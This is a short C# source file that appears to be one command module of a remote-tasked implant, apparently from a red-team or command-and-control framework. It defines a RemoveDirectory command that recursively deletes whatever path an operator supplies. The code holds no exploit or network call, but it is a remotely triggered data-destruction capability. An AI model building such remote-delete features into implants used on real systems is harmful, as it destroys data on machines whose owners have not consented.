using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class RemoveDirectory : DroneCommand
{
    public override byte Command => 0x19;
    public override bool Threaded => false;

    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (!task.Arguments.TryGetValue("recursive", out var recurse))
            recurse = "true";

        Directory.Delete(task.Arguments["path"], bool.Parse(recurse));
        return Task.CompletedTask;
    }
}